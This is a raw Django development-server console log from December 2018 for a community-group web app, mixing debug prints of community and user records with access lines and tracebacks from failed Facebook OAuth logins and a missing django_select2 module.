    *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/actions.py", line 43, in do_complete
    user = backend.complete(user=user, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/backends/base.py", line 40, in complete
    return self.auth_complete(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/utils.py", line 259, in wrapper
    return func(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/backends/facebook.py", line 92, in auth_complete
    self.process_error(self.data)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/backends/facebook.py", line 87, in process_error
    data.get('error_code'))
social_core.exceptions.AuthCanceled: Authentication process canceled: Insecure login blocked: You can't get an access token or log in to this app from an insecure page. Try re-loading the page as https://
[19/Dec/2018 15:57:25] "GET /oauth/complete/facebook/?error_code=1349187&error_message=Insecure+login+blocked%3A+You+can%27t+get+an+access+token+or+log+in+to+this+app+from+an+insecure+page.+Try+re-loading+the+page+as+https%3A%2F%2F&state=EfE4zqgu87xuybwi6c9fCY0rrdRXGFzk HTTP/1.1" 500 106586
Not Found: /favicon.ico
[19/Dec/2018 15:57:28] "GET /favicon.ico HTTP/1.1" 404 5964
[19/Dec/2018 15:58:10] "GET / HTTP/1.1" 200 22756
Validating models...

System check identified no issues (0 silenced).
December 19, 2018 - 07:02:30
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
admin <QuerySet [<Admins: IIT Delhi Entrepreneurs in Gurgaon>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>]
admin <QuerySet [<Admins: Noida Cycling Club (NCC)>]>
3
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
{}
: [<Community: Noida Cycling Club (NCC)>]
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Noida Cycling Club (NCC)>]>
3
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
{}
: [<Community: Noida Cycling Club (NCC)>]
admin <QuerySet [<Admins: Noida Cycling Club (NCC)>]>
3
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
5
data: <QuerySet []>
5
data: <QuerySet []>
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
here
None
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: []
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Noida Cycling Club (NCC)>]>
3
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
admin <QuerySet [<Admins: test_community_1>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Nipun Goyal>]
{}
: [<Community: Noida Cycling Club (NCC)>]
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Gurgaon Road Runners>]>
4
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
Performing system checks...

System check identified no issues (0 silenced).
December 19, 2018 - 07:03:20
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Noida Cycling Club (NCC)>]>
3
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Alumni', '_': '1545221771624'}
<QuerySet [<Category: test_community_1>, <Category: IIT Delhi Entrepreneurs in Gurgaon>]>
comm : [{'id': 3, 'name': 'test_community_1', 'about': 'about', 'image_url': '/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg', 'location': 'Roorkee, Uttrakhand, India', 'members_count': 3}, {'id': 4, 'name': 'IIT Delhi Entrepreneurs in Gurgaon', 'about': 'This is an exclusive group for entrepreneurs who are IIT Delhi Alumni and are based out of Gurgaon.', 'image_url': '/media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg', 'location': 'Gurgaon', 'members_count': 3}]
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'College', '_': '1545221771625'}
<QuerySet []>
comm : []
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Sports', '_': '1545221771626'}
<QuerySet []>
comm : []
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Sports & Fitness', '_': '1545221771627'}
<QuerySet [<Category: Noida Cycling Club (NCC)>]>
comm : [{'id': 5, 'name': 'Noida Cycling Club (NCC)', 'about': 'This is a cycling group focused on all types of rides and motivate people in Noida to take up cycling as it is good for health as well as for environment !\r\n\r\nWe do 4 major things on our rides !\r\n1.Ride\r\n2.Eat\r\n3.Explore\r\n4.Click Pics \r\n\r\nOpen for all and free as well.....We welcome you to join us today !\r\n\r\nSome guidelines our riders are requested to follow:\r\n1. Kindly fill the mandatory membership form,you will find the form link in the group \r\n2. Wear helmet during rides and bring your own spares and toolkits \r\n3. All expenses during foodie rides are contributory\r\n4. Do not create events without informing the admins \r\n5. Wear reflective jacket and use lights on night rides\r\n6. Do not post any 3rd party events without informing the admin\r\n(Spammers will be removed from group as soon as they post anything not related to cycling)\r\n7. Follow traffic rules and use proper hand signals for directions', 'image_url': '/media/media/13071833_1194304533913237_5604740049536472095_o.jpg', 'location': 'Noida', 'members_count': 1}]
admin <QuerySet [<Admins: Noida Cycling Club (NCC)>]>
3
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
{'csrfmiddlewaretoken': 'zfiTuHfFmnvx3EIdkcDZq4nLy7JBtWuhS9VGW2YPHvPncSh6z9B9t06OtYUmLLTd', 'name': 'Gurgaon Road Runners', 'purpose': 'Nothing fancy, just Road Running!', 'about': 'Welcome to Gurgaon Road Runners.\r\n\r\nAt Gurgaon Road Runners, running for fun and fitness is the mantra. If you want to run, run a mile. If you want to experience a different life, run a marathon. The thirst you feel in your throat and lungs will be gone minutes after the race is over. The pain in your legs within days, but the glory of your finish will last forever.\r\n\r\nRun with Gurgaon Road Runners and get infected by the running virus! ', 'category': 'Sports & Fitness', 'location': 'Gurgaon', 'whatsapp_group_link': 'Not available'}
<class 'dict'>
Gurgaon Road Runners
Gurgaon Road Runners
6
6
{'csrfmiddlewaretoken': 'E93hau98zv8MHaQMUuX54hielFIKIfGnX3G4CPSiUDsCQopF9rVf7d1hgwTv045j', 'contact': 'on', 'question_1': 'Please provide a certificate of the longest run that you have completed', 'response1': 'pdf', 'question_2': '', 'response2': ''}
question_1
question_1
admin <QuerySet [<Admins: Gurgaon Road Runners>]>
4
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Noida Cycling Club (NCC)>]>
3
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Noida Cycling Club (NCC)>]>
3
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
here
None
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
Unknown command: 'runsslserver'. Did you mean runserver?
Type 'manage.py help' for usage.
[19/Dec/2018 15:58:24] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
Internal Server Error: /oauth/complete/facebook/
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/views/decorators/cache.py", line 44, in _wrapped_view_func
    response = view_func(request, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_django/utils.py", line 49, in wrapper
    return func(request, backend, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_django/views.py", line 33, in complete
    *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/actions.py", line 43, in do_complete
    user = backend.complete(user=user, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/backends/base.py", line 40, in complete
    return self.auth_complete(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/utils.py", line 259, in wrapper
    return func(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/backends/facebook.py", line 92, in auth_complete
    self.process_error(self.data)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/social_core/backends/facebook.py", line 87, in process_error
    data.get('error_code'))
social_core.exceptions.AuthCanceled: Authentication process canceled: Insecure login blocked: You can't get an access token or log in to this app from an insecure page. Try re-loading the page as https://
[19/Dec/2018 15:58:35] "GET /oauth/complete/facebook/?error_code=1349187&error_message=Insecure+login+blocked%3A+You+can%27t+get+an+access+token+or+log+in+to+this+app+from+an+insecure+page.+Try+re-loading+the+page+as+https%3A%2F%2F&state=EfE4zqgu87xuybwi6c9fCY0rrdRXGFzk HTTP/1.1" 500 106543
[19/Dec/2018 15:58:39] "GET /login/ HTTP/1.1" 200 2762
[19/Dec/2018 15:58:43] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[19/Dec/2018 15:58:45] "GET /oauth/complete/linkedin-oauth2/?code=AQTnCul2NqDifrpH0SJKYR6vPxRiPUny4T8mgV3E74LSXLT65sCKFrbPgRU2H3qdWHhqoPVBDLA9tmU7lxNZ-0_LFVosVPKrr-58dXhgwA3HEQftA_6gyEkDHNOCPN3EU8D1A_PdMm-Fkw8Na7FZP2lSlJr2ZMljF_bpSR1U0k2-zuJspQRJDejyuMJcNw&state=u1s64fPHKNbsAHEU1iUCEzVKNJPzGoKs HTTP/1.1" 302 0
[19/Dec/2018 15:58:46] "GET / HTTP/1.1" 200 23577
Performing system checks...

System check identified no issues (0 silenced).
December 19, 2018 - 15:58:21
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
here
None
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
Unhandled exception in thread started by <function check_errors.<locals>.wrapper at 0x7f8b19a0e400>
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/autoreload.py", line 225, in wrapper
    fn(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/management/commands/runserver.py", line 109, in inner_run
    autoreload.raise_last_exception()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/autoreload.py", line 248, in raise_last_exception
    raise _exception[1]
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/management/__init__.py", line 337, in execute
    autoreload.check_errors(django.setup)()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/autoreload.py", line 225, in wrapper
    fn(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/__init__.py", line 24, in setup
    apps.populate(settings.INSTALLED_APPS)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/apps/registry.py", line 89, in populate
    app_config = AppConfig.create(entry)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/apps/config.py", line 90, in create
    module = import_module(entry)
  File "/home/ec2-user/venv/lib64/python3.7/importlib/__init__.py", line 127, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 1006, in _gcd_import
  File "<frozen importlib._bootstrap>", line 983, in _find_and_load
  File "<frozen importlib._bootstrap>", line 965, in _find_and_load_unlocked
ModuleNotFoundError: No module named 'django_select2'
[19/Dec/2018 16:02:12] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 16:02:15] "GET /creategroup/ HTTP/1.1" 200 10392
[19/Dec/2018 16:02:26] "GET / HTTP/1.1" 200 23561
[19/Dec/2018 16:02:27] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 304 0
[19/Dec/2018 16:02:31] "GET /community/5 HTTP/1.1" 301 0
[19/Dec/2018 16:02:31] "GET /community/5/ HTTP/1.1" 200 15799
[19/Dec/2018 16:02:37] "GET /community/5/members_list HTTP/1.1" 200 7944
[19/Dec/2018 16:02:42] "GET /community/6 HTTP/1.1" 301 0
[19/Dec/2018 16:02:43] "GET /community/6/ HTTP/1.1" 200 15258
[19/Dec/2018 16:02:52] "GET /community/4/ HTTP/1.1" 200 16852
[19/Dec/2018 16:03:07] "GET /creategroup/ HTTP/1.1" 200 10392
[19/Dec/2018 16:05:16] "GET / HTTP/1.1" 200 23561
[19/Dec/2018 16:05:17] "GET /media/media/1.png HTTP/1.1" 304 0
[19/Dec/2018 16:05:18] "GET /media/media/2.png HTTP/1.1" 304 0
[19/Dec/2018 16:05:18] "GET /media/media/3.png HTTP/1.1" 304 0
[19/Dec/2018 16:05:19] "GET /media/media/46831530_10215805946675011_2067582095059845120_n.jpg HTTP/1.1" 200 80581
[19/Dec/2018 16:05:19] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 304 0
[19/Dec/2018 16:06:26] "GET / HTTP/1.1" 200 23561
[19/Dec/2018 16:06:29] "GET / HTTP/1.1" 200 23561
[19/Dec/2018 16:06:30] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
Validating models...

System check identified no issues (0 silenced).
December 19, 2018 - 16:00:45
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Noida Cycling Club (NCC)>]>
3
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
admin <QuerySet [<Admins: Gurgaon Road Runners>]>
4
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
admin <QuerySet [<Admins: IIT Delhi Entrepreneurs in Gurgaon>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>]
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
Unhandled exception in thread started by <function check_errors.<locals>.wrapper at 0x7fc3ebac4400>
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/autoreload.py", line 225, in wrapper
    fn(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/management/commands/runserver.py", line 109, in inner_run
    autoreload.raise_last_exception()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/autoreload.py", line 248, in raise_last_exception
    raise _exception[1]
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/management/__init__.py", line 337, in execute
    autoreload.check_errors(django.setup)()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/autoreload.py", line 225, in wrapper
    fn(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/__init__.py", line 24, in setup
    apps.populate(settings.INSTALLED_APPS)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/apps/registry.py", line 89, in populate
    app_config = AppConfig.create(entry)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/apps/config.py", line 90, in create
    module = import_module(entry)
  File "/home/ec2-user/venv/lib64/python3.7/importlib/__init__.py", line 127, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 1006, in _gcd_import
  File "<frozen importlib._bootstrap>", line 983, in _find_and_load
  File "<frozen importlib._bootstrap>", line 965, in _find_and_load_unlocked
ModuleNotFoundError: No module named 'django_select2'
[19/Dec/2018 16:07:40] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 200 374377
[19/Dec/2018 16:07:41] "GET /media/media/46831530_10215805946675011_2067582095059845120_n.jpg HTTP/1.1" 200 80581
[19/Dec/2018 16:07:42] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[19/Dec/2018 16:07:44] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Validating models...

System check identified no issues (0 silenced).
December 19, 2018 - 16:07:33
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
[19/Dec/2018 16:08:24] "GET / HTTP/1.1" 301 0
[19/Dec/2018 16:08:26] "GET / HTTP/1.1" 200 22782
[19/Dec/2018 16:08:26] "GET / HTTP/1.1" 301 0
[19/Dec/2018 16:08:28] "GET /media/media/logo.png HTTP/1.1" 200 11255
[19/Dec/2018 16:08:28] "GET / HTTP/1.1" 200 22782
[19/Dec/2018 16:08:29] "GET / HTTP/1.1" 200 23563
[19/Dec/2018 16:08:30] "GET /media/media/logo.png HTTP/1.1" 200 11255
[19/Dec/2018 16:08:32] "GET /media/media/1.png HTTP/1.1" 200 217917
[19/Dec/2018 16:08:33] "GET /media/media/2.png HTTP/1.1" 200 218829
[19/Dec/2018 16:08:34] "GET /media/media/3.png HTTP/1.1" 200 62062
[19/Dec/2018 16:08:35] "GET /media/media/1.png HTTP/1.1" 200 217917
[19/Dec/2018 16:08:35] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[19/Dec/2018 16:08:36] "GET /media/media/logo.png HTTP/1.1" 200 11255
[19/Dec/2018 16:08:37] "GET /media/media/1.png HTTP/1.1" 200 217917
[19/Dec/2018 16:08:38] "GET /media/media/2.png HTTP/1.1" 200 218829
[19/Dec/2018 16:08:39] "GET /media/media/3.png HTTP/1.1" 200 62062
[19/Dec/2018 16:08:40] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 200 374377
[19/Dec/2018 16:08:41] "GET / HTTP/1.1" 200 23561
[19/Dec/2018 16:08:44] "GET /media/media/2.png HTTP/1.1" 200 218829
[19/Dec/2018 16:08:44] "GET / HTTP/1.1" 301 0
[19/Dec/2018 16:08:45] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 16:08:45] "GET /media/media/3.png HTTP/1.1" 200 62062
[19/Dec/2018 16:08:47] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 200 374377
[19/Dec/2018 16:09:00] "GET / HTTP/1.1" 200 22782
[19/Dec/2018 16:09:01] "GET / HTTP/1.1" 200 23577
[19/Dec/2018 16:09:02] "GET /media/media/46831530_10215805946675011_2067582095059845120_n.jpg HTTP/1.1" 200 80581
[19/Dec/2018 16:09:02] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[19/Dec/2018 16:09:03] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[19/Dec/2018 16:09:04] "GET /media/media/46831530_10215805946675011_2067582095059845120_n.jpg HTTP/1.1" 200 80581
[19/Dec/2018 16:09:05] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[19/Dec/2018 16:09:06] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 16:09:06] "GET /media/media/logo.png HTTP/1.1" 200 11255
[19/Dec/2018 16:09:07] "GET /media/media/1.png HTTP/1.1" 200 217917
[19/Dec/2018 16:09:08] "GET /media/media/2.png HTTP/1.1" 200 218829
[19/Dec/2018 16:09:09] "GET /media/media/3.png HTTP/1.1" 200 62062
[19/Dec/2018 16:09:17] "GET /community/5 HTTP/1.1" 301 0
[19/Dec/2018 16:09:18] "GET /community/5/ HTTP/1.1" 200 15059
[19/Dec/2018 16:09:22] "GET /creategroup/ HTTP/1.1" 200 10394
[19/Dec/2018 16:09:54] "GET /community/5/members_list HTTP/1.1" 200 7169
[19/Dec/2018 16:09:54] "GET /creategroup/ HTTP/1.1" 200 10394
[19/Dec/2018 16:10:18] "GET /community/5/ HTTP/1.1" 200 15059
[19/Dec/2018 16:10:29] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[19/Dec/2018 16:11:26] "GET /oauth/complete/linkedin-oauth2/?code=AQSMbK4CxG-xVQJDqME5K8hPS7iUj8tIvmRlKPudzjS96EveTnLz22-QyA09_DIxeTYva6SjvcJpVD_fcLGAGj4k2p5anb1i1LbfYev7-3AOtkfxyqmLc66vbJExoSpmYO8goaUzvLTUOyOvzSkdZdyMJEJj0CKMsm8I1-LdoE07eJUTR_6PS3MTkwKbrQ&state=d6YFiugJVRYQou09ECuI3SdKiBoPPvcy HTTP/1.1" 302 0
[19/Dec/2018 16:11:27] "GET / HTTP/1.1" 200 23577
[19/Dec/2018 16:11:32] "GET /creategroup/ HTTP/1.1" 200 10392
[19/Dec/2018 16:13:41] "GET /requests HTTP/1.1" 200 7177
[19/Dec/2018 16:14:35] "GET /profile/13/mycommunities HTTP/1.1" 200 6925
[19/Dec/2018 16:20:11] "GET / HTTP/1.1" 200 23577
[19/Dec/2018 16:20:12] "GET /media/media/46831530_10215805946675011_2067582095059845120_n.jpg HTTP/1.1" 304 0
[19/Dec/2018 16:20:19] "GET /profile/13/mycommunities HTTP/1.1" 200 6925
[19/Dec/2018 16:20:22] "GET /profile/13/communities_as_admin HTTP/1.1" 200 6936
[19/Dec/2018 16:20:25] "GET /profile/13/mycommunities HTTP/1.1" 200 6925
[19/Dec/2018 16:20:28] "GET /creategroup/ HTTP/1.1" 200 10408
[19/Dec/2018 16:22:35] "GET / HTTP/1.1" 200 23561
[19/Dec/2018 16:22:37] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 16:22:42] "GET / HTTP/1.1" 200 23561
[19/Dec/2018 16:22:42] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 16:22:45] "GET /community/5/ HTTP/1.1" 200 15799
[19/Dec/2018 16:22:51] "GET / HTTP/1.1" 200 23561
[19/Dec/2018 16:23:50] "GET / HTTP/1.1" 301 0
Performing system checks...

System check identified no issues (0 silenced).
December 19, 2018 - 16:08:22
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
Validating models...

System check identified no issues (0 silenced).
December 19, 2018 - 16:08:17
